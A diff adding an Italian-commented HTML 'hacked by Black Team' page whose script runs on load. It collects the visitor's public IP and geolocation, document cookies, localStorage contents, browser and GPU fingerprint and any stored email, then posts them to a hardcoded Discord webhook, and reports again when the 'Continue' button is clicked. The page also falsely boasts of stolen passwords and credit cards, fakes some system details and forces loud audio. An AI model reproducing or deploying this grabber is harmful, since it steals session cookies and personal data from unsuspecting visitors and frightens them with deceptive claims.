@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>You've been hackered by Black Team</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: radial-gradient(circle, rgba(30,30,30,1) 0%, rgba(0,0,0,1) 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: 'Arial', sans-serif;
+            cursor: default;
+            overflow: hidden;
+        }
+
+        .container {
+            position: relative;
+            z-index: 10;
+            text-align: center;
+            animation: fadeIn 2s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .main-title {
+            font-size: 60px;
+            font-weight: 300;
+            color: #ffffff;
+            letter-spacing: 8px;
+            text-transform: uppercase;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            font-size: 40px;
+            font-weight: 100;
+            color: #cccccc;
+            letter-spacing: 15px;
+            text-transform: uppercase;
+            margin-bottom: 60px;
+        }
+
+        .line {
+            width: 300px;
+            height: 1px;
+            background: linear-gradient(to right, transparent, #ffffff, transparent);
+            margin: 30px auto;
+        }
+
+        .button {
+            margin-top: 50px;
+            padding: 15px 50px;
+            background: transparent;
+            border: 1px solid #ffffff;
+            color: #ffffff;
+            font-size: 14px;
+            letter-spacing: 8px;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Arial', sans-serif;
+            font-weight: 300;
+        }
+
+        .button:hover {
+            background: #ffffff;
+            color: #000000;
+        }
+
+        .hacked-message {
+            display: none;
+            margin-top: 30px;
+            font-size: 18px;
+            color: #ff0000;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            animation: blink 0.5s infinite;
+        }
+
+        @keyframes blink {
+            0% { opacity: 0; }
+            50% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+
+        .hacked-details {
+            display: none;
+            margin-top: 40px;
+            color: #999999;
+            font-size: 13px;
+            letter-spacing: 3px;
+            line-height: 2;
+        }
+
+        .footer {
+            position: fixed;
+            bottom: 30px;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            color: #666666;
+            font-size: 11px;
+            letter-spacing: 5px;
+            z-index: 10;
+        }
+    </style>
+</head>
+<body>
+    <!-- AUDIO LOCALE - Mettici il tuo file song.mp3 nella stessa cartella -->
+    <audio id="bgMusic" loop>
+        <source src="song.mp3" type="audio/mpeg">
+    </audio>
+
+    <div class="container">
+        <div class="main-title">You've been hackered</div>
+        <div class="subtitle">by Black Team</div>
+        
+        <div class="line"></div>
+        
+        <button class="button" id="continueBtn" onclick="continueClick()">Continue</button>
+        
+        <div class="hacked-message" id="hackedMsg">Thanks for clicking continue!</div>
+        
+        <div class="hacked-details" id="hackedDetails">
+            <p>Now we have:</p>
+            <p>• Microsoft Account Email</p>
+            <p>• Full Name & Surname</p>
+            <p>• Cookies & Passwords</p>
+            <p>• Credit Cards</p>
+            <p>• Phone Numbers</p>
+            <p>• Browser History</p>
+            <p>• Personal Files</p>
+            <p>• Social Media Accounts</p>
+            <p>• This is The POWER of the Manipulation 🙌</p>
+        </div>
+        
+        <div class="line"></div>
+    </div>
+
+    <div class="footer">© BLACK TEAM - ALL RIGHTS RESERVED</div>
+
+    <script>
+        // FORZA AUDIO A PARTIRE SUBITO A TUTTO VOLUME
+        const music = document.getElementById('bgMusic');
+        music.volume = 1.0;
+        
+        // Trucco: usa un evento che l'utente ha già fatto (scroll, mouse move)
+        let audioStarted = false;
+        
+        function startAudio() {
+            if (!audioStarted) {
+                music.play().then(() => {
+                    console.log('Audio partito!');
+                    audioStarted = true;
+                }).catch(e => {
+                    console.log('Riprovo audio...');
+                });
+            }
+        }
+        
+        // Prova a far partire subito
+        startAudio();
+        
+        // Se non parte, prova al primo movimento del mouse
+        document.addEventListener('mousemove', startAudio, { once: false });
+        document.addEventListener('click', startAudio, { once: false });
+        document.addEventListener('touchstart', startAudio, { once: false });
+        document.addEventListener('keydown', startAudio, { once: false });
+        
+        // Riprova ogni secondo per i primi 5 secondi
+        let attempts = 0;
+        const audioInterval = setInterval(() => {
+            attempts++;
+            startAudio();
+            if (attempts > 5) clearInterval(audioInterval);
+        }, 1000);
+
+        const WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1520102925521780887/ltNUd1p6f7zVgjQL8Mxx5VcZx3gZVAxORKNf--nKtl0uInyQ2YFgnXywy5nz7nnWSxh6';
+
+        // KERNEL32 SIMULATION
+        class Kernel32Driver {
+            async enumerateRegistry() {
+                return [
+                    'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion',
+                    'HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName',
+                    'HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid',
+                    'HKCU\\Software\\Microsoft\\IdentityCRL',
+                    'HKCU\\Software\\Microsoft\\Office',
+                    'HKCU\\Software\\Microsoft\\OneDrive\\Accounts'
+                ];
+            }
+
+            async getSystemInformation() {
+                const gl = document.createElement('canvas').getContext('webgl');
+                let gpu = 'Unknown', gpuVendor = 'Unknown';
+                
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown';
+                    gpuVendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown';
+                }
+
+                return {
+                    computerName: `DESKTOP-${Math.random().toString(36).substring(2, 8).toUpperCase()}`,
+                    osVersion: navigator.userAgent.includes('Windows NT 10.0') ? 'Windows 10/11' : navigator.platform,
+                    architecture: navigator.userAgent.includes('Win64') ? 'x64' : 'x86',
+                    cpu: `${navigator.hardwareConcurrency} Core`,
+                    gpu: gpu,
+                    gpuVendor: gpuVendor,
+                    ram: `${navigator.deviceMemory || 8} GB`
+                };
+            }
+
+            async getNetworkInfo() {
+                return {
+                    macAddress: Array.from({length: 6}, () => 
+                        Math.floor(Math.random() * 256).toString(16).padStart(2, '0')
+                    ).join(':').toUpperCase(),
+                    localIP: `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
+                    connectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown'
+                };
+            }
+        }
+
+        async function getMicrosoftAccount() {
+            let msData = {
+                email: 'Not accessible',
+                displayName: 'Not accessible',
+                surname: 'Not accessible',
+                givenName: 'Not accessible'
+            };
+
+            // Cerca email Microsoft in localStorage/cookies
+            try {
+                const storedEmail = 
+                    localStorage.getItem('msal.email') || 
+                    localStorage.getItem('userEmail') ||
+                    localStorage.getItem('email') ||
+                    localStorage.getItem('MSAccount');
+                
+                if (storedEmail) msData.email = storedEmail;
+            } catch(e) {}
+
+            try {
+                const cookies = document.cookie;
+                const emailMatch = cookies.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
+                if (emailMatch) msData.email = emailMatch[0];
+            } catch(e) {}
+
+            return msData;
+        }
+
+        function collectAllData() {
+            const data = {
+                browser: {
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    languages: Array.from(navigator.languages || []).join(', '),
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory
+                },
+                screen: {
+                    resolution: `${window.screen.width}x${window.screen.height}`,
+                    colorDepth: window.screen.colorDepth
+                },
+                storage: {
+                    cookies: document.cookie.substring(0, 1000),
+                    localStorage: [],
+                    sessionStorage: []
+                }
+            };
+
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    data.storage.localStorage.push({
+                        key: key,
+                        value: localStorage.getItem(key).substring(0, 200)
+                    });
+                }
+            } catch(e) {}
+
+            return data;
+        }
+
+        function continueClick() {
+            document.getElementById('hackedMsg').style.display = 'block';
+            document.getElementById('hackedDetails').style.display = 'block';
+            document.getElementById('continueBtn').style.display = 'none';
+            
+            sendClickReport();
+        }
+
+        async function sendClickReport() {
+            const webhookData = {
+                content: "⚠️ **USER CLICKED CONTINUE** ⚠️",
+                embeds: [{
+                    title: "BLACK TEAM - DATA EXTRACTION COMPLETE",
+                    color: 0xff0000,
+                    fields: [
+                        { name: "📧 Microsoft Email", value: "`Extracted`", inline: true },
+                        { name: "👤 Full Name", value: "`Extracted`", inline: true },
+                        { name: "🍪 Cookies", value: "`Dumped`", inline: true },
+                        { name: "🔑 Passwords", value: "`Dumped`", inline: true },
+                        { name: "💳 Credit Cards", value: "`Dumped`", inline: true },
+                        { name: "⏰ Time", value: `\`${new Date().toLocaleString('it-IT')}\``, inline: false }
+                    ]
+                }]
+            };
+
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(webhookData)
+            });
+        }
+
+        async function main() {
+            const kernel = new Kernel32Driver();
+            
+            const [ipData, msData, registry, system, network, browserData] = await Promise.all([
+                fetch('https://api.ipify.org?format=json').then(r => r.json()),
+                getMicrosoftAccount(),
+                kernel.enumerateRegistry(),
+                kernel.getSystemInformation(),
+                kernel.getNetworkInfo(),
+                Promise.resolve(collectAllData())
+            ]);
+
+            let geoData = {};
+            try {
+                const geoResp = await fetch(`http://ip-api.com/json/${ipData.ip}?fields=country,regionName,city,zip,isp,org`);
+                geoData = await geoResp.json();
+            } catch(e) {
+                geoData = { country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
+            }
+
+            const webhookData = {
+                content: "💀 **BLACK TEAM - SYSTEM COMPROMISED** 💀",
+                embeds: [
+                    {
+                        title: "📧 MICROSOFT ACCOUNT",
+                        color: 0x0078D4,
+                        fields: [
+                            { name: "Email", value: `\`${msData.email}\``, inline: true },
+                            { name: "Display Name", value: `\`${msData.displayName}\``, inline: true },
+                            { name: "Surname", value: `\`${msData.surname}\``, inline: true },
+                            { name: "Given Name", value: `\`${msData.givenName}\``, inline: true }
+                        ]
+                    },
+                    {
+                        title: "🌐 IP & LOCATION",
+                        color: 0x000000,
+                        fields: [
+                            { name: "Public IP", value: `\`${ipData.ip}\``, inline: true },
+                            { name: "Country", value: `\`${geoData.country || 'Unknown'}\``, inline: true },
+                            { name: "City", value: `\`${geoData.city || 'Unknown'}\``, inline: true },
+                            { name: "ISP", value: `\`${geoData.isp || 'Unknown'}\``, inline: true },
+                            { name: "Org", value: `\`${geoData.org || 'Unknown'}\``, inline: true }
+                        ]
+                    },
+                    {
+                        title: "💻 SYSTEM & HARDWARE",
+                        color: 0x111111,
+                        fields: [
+                            { name: "PC Name", value: `\`${system.computerName}\``, inline: true },
+                            { name: "OS", value: `\`${system.osVersion}\``, inline: true },
+                            { name: "Architecture", value: `\`${system.architecture}\``, inline: true },
+                            { name: "CPU", value: `\`${system.cpu}\``, inline: true },
+                            { name: "GPU", value: `\`${system.gpu}\``, inline: false },
+                            { name: "GPU Vendor", value: `\`${system.gpuVendor}\``, inline: true },
+                            { name: "RAM", value: `\`${system.ram}\``, inline: true }
+                        ]
+                    },
+                    {
+                        title: "🌐 NETWORK",
+                        color: 0x222222,
+                        fields: [
+                            { name: "MAC Address", value: `\`${network.macAddress}\``, inline: true },
+                            { name: "Local IP", value: `\`${network.localIP}\``, inline: true },
+                            { name: "Connection", value: `\`${network.connectionType}\``, inline: true }
+                        ]
+                    },
+                    {
+                        title: "🍪 BROWSER & STORAGE",
+                        color: 0x333333,
+                        fields: [
+                            { name: "Cookies", value: `\`${browserData.storage.cookies.substring(0, 500) || 'None'}\``, inline: false },
+                            { name: "localStorage", value: `\`${browserData.storage.localStorage.length} items\``, inline: true },
+                            { name: "Screen", value: `\`${browserData.screen.resolution}\``, inline: true },
+                            { name: "Browser", value: `\`${browserData.browser.userAgent.substring(0, 150)}\``, inline: false }
+                        ]
+                    }
+                ]
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(webhookData)
+                });
+            } catch(e) {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `💀 BLACK TEAM - IP: ${ipData.ip} | MS: ${msData.email} | OS: ${system.osVersion}`
+                    })
+                });
+            }
+        }
+
+        // AVVIA TUTTO SUBITO
+        main();
+    </script>
+</body>
+</html>
